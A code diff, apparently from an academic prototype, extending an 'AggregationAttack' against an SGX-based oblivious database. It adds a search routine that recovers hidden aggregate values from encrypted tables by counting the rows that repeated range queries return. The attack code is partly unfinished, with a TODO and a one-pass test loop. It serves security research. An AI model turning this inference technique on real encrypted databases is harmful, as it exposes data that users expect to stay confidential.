@@ -1064,19 +1064,6 @@ PureContinueAT(sgx_enclave_id_t enclave_id, int status)
 		}
 	}
 
-
-
-
-
-
-
-
-
-
-
-
-
-
 	int tableid = i;
 	oblidbextraio::DBTable* targettable = dbtables[i];
 	int orgrownum = targettable->TableSize();
@@ -1902,6 +1889,87 @@ CheckPointerArray(uint8_t** array, int size)
 }
 
 /**
+ * 代码中经常有一个需求，需要规划为 helper 函数，即根据 select count 的结果确定找边界的准确值
+ * 即夹逼的一个过程 Squeeze
+ * 本次夹逼的上界与下界
+ * 
+ * down: 本次夹逼的绝对下界，本次需要的数据不会小于 down
+ * up: 本次夹逼的绝对上界，本次需要的数据不会大于 up
+ * compare: 满足本次 range 的结果行的个数
+ * step: 初始 step，夹逼过程中的步长，它应该逐渐减少为 0 即可找到夹逼的目标, 初始值调用函数 set，默认值 100
+ * upordown: 确定的是上界还是下界，true 代表需要确定的是上界限，false 代表需要确定的是下界			
+ */
+int
+SqueezeForValue(
+	sgx_enclave_id_t enclave_id, 
+	int status, 
+	int down, int up,
+	int compare, bool upordown, uint32_t step=100)
+{
+	assert(step>0);
+	int low=down, high=up;
+	int lower = low-1, higher = high+1;
+	int rettableid;
+	int tuplenum;
+	bool continuous = true;
+
+	if(upordown) {
+		low += step;
+		lower = low-1;
+	} else {
+		high -= step;
+		higher = higher-1;
+	}
+
+	while(step!=0)
+	{
+		Condition windowcond;
+		windowcond.numClauses = 2;
+		windowcond.fieldNums[0] = 1;
+		windowcond.fieldNums[1] = 1;
+		windowcond.conditionType[0] = 1;
+		windowcond.conditionType[1] = -1;
+		windowcond.values[0] = (uint8_t*)&lower;
+		windowcond.values[1] = (uint8_t*)&higher;
+		windowcond.nextCondition = NULL;
+
+		selectRows(enclave_id, (int*)&status, "AggrSortTable", -1, windowcond, -1, -1, 2, 0);  // small select, i need the size of S
+		rettableid = GetNextIdOutSgx() - 1;
+		tuplenum = oblivStructureSizes[rettableid];
+		deleteTable(enclave_id, (int*)&status, "ReturnTable");
+
+		// 这个地方可能需要多测试一下
+		if(tuplenum==compare) {
+			// 盈
+			if(continuous) { step *= 2; }
+			else { step /= 2; }
+			if(upordown) { low += step; } 
+			else { high -= step; }
+		} else {
+			// 亏
+			if(step>=2) { step /= 2; }
+			if(upordown) { low -= step; } 
+			else { high += step; }
+			continuous = false;
+		}
+
+		if(upordown) { lower = low-1; } 
+		else { higher = high+1; }
+	}
+
+	if(upordown){ return low; } 
+	else { return high; }
+}
+
+/**
+ * enclave_id: sgx相关
+ * status: sgx相关
+ * TempTable: 临时表，select group 的对象，容器
+ * first: 要比较第一个数据所在的加密行
+ * second: 要比较第二个数据所在的加密行
+ * ATK_BLOCK_SIZE: 加密行的大小
+ * nocond: select 条件
+ * 
  * 将比较大小抽象出来，上面的算法会选择的可以自由一些
  * first < second, return -1
  * first >= second, return 1
@@ -2168,6 +2236,8 @@ AggregationAttack(sgx_enclave_id_t enclave_id, int status)
 	// char* arrayname[] = {"AggrCount", "AggrSum", "AggrMin", "AggrMax", "AggrAvg"};
 	std::map<int, std::string> show;
 	int arrayseq[] = {0,1,2,3,4};
+
+	int64_t result[5] = {0};
 	show.insert(std::make_pair<int, std::string>(0, "AggrCount"));
 	show.insert(std::make_pair<int, std::string>(1, "AggrSum"));
 	show.insert(std::make_pair<int, std::string>(2, "AggrMin"));
@@ -2208,7 +2278,15 @@ AggregationAttack(sgx_enclave_id_t enclave_id, int status)
 	}
 	std::printf("finish sort, from small to large\n");
 	// for(int i=0;i<5;++i) { std::printf("%s ", arrayname[i]); }
-	for(int i=0;i<5;++i) { std::cout << show[arrayseq[i]] << " "; }
+
+	// for(int i=0;i<5;++i) { std::cout << arrayseq[i] << " "; }
+	// std::printf("\n\n");
+	for(int i=0;i<5;++i) { 
+		std::cout << show[arrayseq[i]] << " "; 
+		if(arrayseq[i]==0){
+			result[i] = rowline;
+		}
+	}
 	std::printf("\n\n");
 	deleteTable(enclave_id, (int*)&status, "TempValueTable");  // TempValueTable 是一个两行的表，现在用不到了已经
 
@@ -2237,9 +2315,15 @@ AggregationAttack(sgx_enclave_id_t enclave_id, int status)
 	);
 
 	uint8_t* SortAggrTable = (uint8_t*)oblivStructures[sortaggrtableid];
-	// 构建新的排序表
-	for(int j=0;j<5;++j){
-		memcpy((void*)(SortAggrTable+ATK_BLOCK_SIZE*j), (void*)basearray[arrayseq[j]], ATK_BLOCK_SIZE);
+	// 构建新的排序表，这里是否排序实际上并不会影响结果，但是为啥排不对呢，我丢
+	// basearray 本来就已经是排过序的表了，这里不需要再取一次下标了
+	for(int j=0;j<5;++j) {
+		uint8_t* dst = SortAggrTable+ATK_BLOCK_SIZE*j;
+		// std::printf("j:%d,arrayseq[j]:%d\n",j, arrayseq[j]);
+		// uint8_t* src = basearray[arrayseq[j]];
+		uint8_t* src = basearray[j];  // 这里已经完成了排序
+		memcpy((void*)dst, (void*)src, ATK_BLOCK_SIZE);
+		decryptOneBlock(enclave_id, (int*)&status, (Encrypted_Linear_Scan_Block*)src, sortaggrtableid);
 	}
 
 	// 需要自然数区上的窗口去滑动了，count 只能作为一个边界
@@ -2260,45 +2344,194 @@ AggregationAttack(sgx_enclave_id_t enclave_id, int status)
 
 	// 如何根据 AggrCount=360000 确定上下界呢，各加减这个数吧，然后二分
 	int beginsize=5, tuplenum=0;
-	int ghighest=2*rowcount;
-	int low, lower;  // 预设的下限
-	int high, higher;  // 预设的上限
 
-	std::printf("start find the value of up and down!");
+	int low=0, lower=low-1;  // 预设的下限
+	int high=rowcount, higher=high+1;  // 预设的上限
+	int times=0;  // 找上下界的时候最大的循环次数，因为2倍2倍的增长上下界是平方增长，times是不可能很大的
+
+	int _rettableid;
+
+	int oldlow, oldhigh;
+
+	std::printf("\n\nstart find the value of up and down!\n");
 	// 首先要判断一个绝对上界限与绝对下界限
 	while(tuplenum!=beginsize) {
-		// int beginsize=5, tuplenum=0;
-		low = 0;
-		lower = -1;
-		high = ghighest;
-		higher = ghighest+1;
-
 		Condition windowcond;
 		windowcond.numClauses = 2;
 		windowcond.fieldNums[0] = 1;
-		windowcond.fieldNums[0] = 1;
+		windowcond.fieldNums[1] = 1;
 		windowcond.conditionType[0] = 1;
-		windowcond.conditionType[0] = -1;
+		windowcond.conditionType[1] = -1;
 		windowcond.values[0] = (uint8_t*)&lower;
 		windowcond.values[1] = (uint8_t*)&higher;
 		windowcond.nextCondition = NULL;
 
-		selectRows(enclave_id, (int*)&status, "AggrSortTable", -1, windowcond, -1, -1, 1, 0);  // 1 means continuous
-		tuplenum = oblivStructureSizes[sortaggrtableid];
-		// std::printf("size of s:%d\n", tuplenum);
-		deleteTable(enclave_id, (int*)&status, "AggrSortTable");
+		selectRows(enclave_id, (int*)&status, "AggrSortTable", -1, windowcond, -1, -1, 2, 0);  // 1 means continuous
+		_rettableid = GetNextIdOutSgx() - 1;
+		tuplenum = oblivStructureSizes[_rettableid];
+		// std::printf("in find abs, size of s:%d\n", tuplenum);
+		deleteTable(enclave_id, (int*)&status, "ReturnTable");  // 这个表之前删错了，能跑也是不容易
 
-		// if(tuplenum<5) {
-		// 	// 需要继续扩大范围
-		// 	;
-		// }
-		// 上界与下界是可用的
+		if(tuplenum<5) {
+			// 修改 lower 与 higher 的需要继续扩大范围
+			// 因为这里无法确定不符合条件的是上界还是下界。所以上界与下界都需要扩展
+			oldlow=low, oldhigh=high;
+
+			if(low == 0) { --low; }
+			if(high == 0) { ++high; }
+			low *= 2;
+			high *= 2;
+			lower = low-1;
+			higher = high+1;
+			++times;
+			// std::printf(
+			// 	"old low:%d, old high:%d,	new low:%d, new high:%d\n", 
+			// 	oldlow, oldhigh, low, high);
+		}
+		// 上界与下界是可用的，自动就离开循环了
 	}
 
+	std::printf("For the agg seq, abs up limit:%d, down limit:%d,times:%d\n", high, low, times);
+
+	// 先找下界
+	// SqueezeForValue(enclave_id, status, low, high);
 
 
-	int glowest=0;
 
+
+
+
+
+
+
+
+
+
+	// 在绝对上下界的情况下，开始增加下界，寻找最小值
+	// 这个地方实际上是需要找一个游标，不断逼近到 min
+	// 跳出循环应该是 游标逼近到了 min
+	// 跨越正负的过程比我想象的要复杂，交界处需要单独处理，还是思考一个不需要 care 交界的算法来解决这个问题
+	// 在找下界的过程中，没有所谓的二分法，因为我只有一个 value，我所拥有的并非是一个排序的范围，所以严格来说，这个不是二分
+	// abs 下界游标在右移的过程中，增量是需要被二分的，这个取决于自己初始设定的增量的大小，先随意set一个，然后再 二分 缩小即可
+	// oblidb 提供的是大于 小于，没有带等号，如果自己要加带等号的，则需要 lower or higher
+	// 如果上一次的操作是 add，且本次的操作也是 add, 则 add 加倍，否则在区间中震动的不加倍
+	int add=100;
+	low += add;
+	lower = low-1;
+	bool preadd = true;
+
+	while (add!=0)
+	{
+		// std::printf("low:%d, add:%d\n", low, add);
+
+		Condition windowcond;
+		windowcond.numClauses = 2;
+		windowcond.fieldNums[0] = 1;
+		windowcond.fieldNums[1] = 1;
+		windowcond.conditionType[0] = 1;
+		windowcond.conditionType[1] = -1;
+		windowcond.values[0] = (uint8_t*)&lower;
+		windowcond.values[1] = (uint8_t*)&higher;
+		windowcond.nextCondition = NULL;
+
+		selectRows(enclave_id, (int*)&status, "AggrSortTable", -1, windowcond, -1, -1, 2, 0);  // 1 means continuous
+		_rettableid = GetNextIdOutSgx() - 1;
+		tuplenum = oblivStructureSizes[_rettableid];
+		// std::printf("in find abs down, size of s:%d\n\n", tuplenum);
+		deleteTable(enclave_id, (int*)&status, "ReturnTable");
+
+		if(tuplenum==5){
+			// 如果没到，则线性加，如果差距过大，可能会使得性能极具降低
+			if(preadd) { add *= 2; }
+			else {
+				// 某一次的结果是 4，low 就会左移一个 add, 然后发现结果变成了 5，所以 low 又需要右移
+				// 这个的右移动不能是之前的那个add，否则这个结果其实已经是计算过的了，所以 add 需要折半
+				add /= 2;
+			}
+			low += add;
+		} else {
+			// 如果已经超过了，则说明上一次 add 加多了
+			// 只需要加一半就可以了，即在当前游标的减去增量的一半就可以了
+			if(add>=2) { add /= 2; }
+			low -= add;
+			preadd=false;
+		}
+		lower = low-1;
+	}
+
+	if(!result[0]) { result[0] = low; }
+	std::printf("Result down limit:%d\n", low);
+
+
+	// 用同样的方法可以去找上界
+	int des=100;
+	high -= des;
+	higher = higher-1;
+	bool predes = true;  // 连续des时，需要按照指数去进行
+
+	while (des!=0)
+	{
+		// std::printf("high:%d, des:%d\n", high, des);
+		Condition windowcond;
+		windowcond.numClauses = 2;
+		windowcond.fieldNums[0] = 1;
+		windowcond.fieldNums[1] = 1;
+		windowcond.conditionType[0] = 1;
+		windowcond.conditionType[1] = -1;
+		windowcond.values[0] = (uint8_t*)&lower;
+		windowcond.values[1] = (uint8_t*)&higher;
+		windowcond.nextCondition = NULL;
+
+		selectRows(enclave_id, (int*)&status, "AggrSortTable", -1, windowcond, -1, -1, 2, 0);  // 1 means continuous
+		_rettableid = GetNextIdOutSgx() - 1;
+		tuplenum = oblivStructureSizes[_rettableid];
+		// std::printf("in find abs up, size of s:%d\n\n", tuplenum);
+		deleteTable(enclave_id, (int*)&status, "ReturnTable");
+
+		if(tuplenum==5){
+			// 如果没到，则线性加，如果差距过大，可能会使得性能极具降低
+			if(predes) { des *= 2; }
+			else { des /= 2; }
+			high -= des;
+		} else {
+			if(des>=2) { des /= 2; }
+			high += des;
+			predes=false;
+		}
+		higher = high+1;
+	}
+	if(!result[4]) { result[4] = high; }
+	// std::printf("Result up limit:%d\n", high);
+
+
+	// 整个序列的上界与下界都已经确定了，现在其实可以挨个确定序列中每一个值的大小，从前向后或从后先前都可以
+	// 从前向后确定各个 value
+	while (true)
+	{
+		Condition windowcond;
+		windowcond.numClauses = 2;
+		windowcond.fieldNums[0] = 1;
+		windowcond.fieldNums[1] = 1;
+		windowcond.conditionType[0] = 1;
+		windowcond.conditionType[1] = -1;
+		windowcond.values[0] = (uint8_t*)&lower;
+		windowcond.values[1] = (uint8_t*)&higher;
+		windowcond.nextCondition = NULL;
+
+		selectRows(enclave_id, (int*)&status, "AggrSortTable", -1, windowcond, -1, -1, 2, 0);
+		_rettableid = GetNextIdOutSgx() - 1;
+		tuplenum = oblivStructureSizes[_rettableid];
+		deleteTable(enclave_id, (int*)&status, "ReturnTable");
+
+		std::printf("only test once: %d\n", tuplenum);
+
+		break;
+	}
+
+	for(int l=0;l<5;++l) { std::printf("%ld ", result[l]); }
+	std::printf("\n\n");
+
+	// TODO 最后需要整合代码
 	deleteTable(enclave_id, (int*)&status, "rankings");
 	return;
 
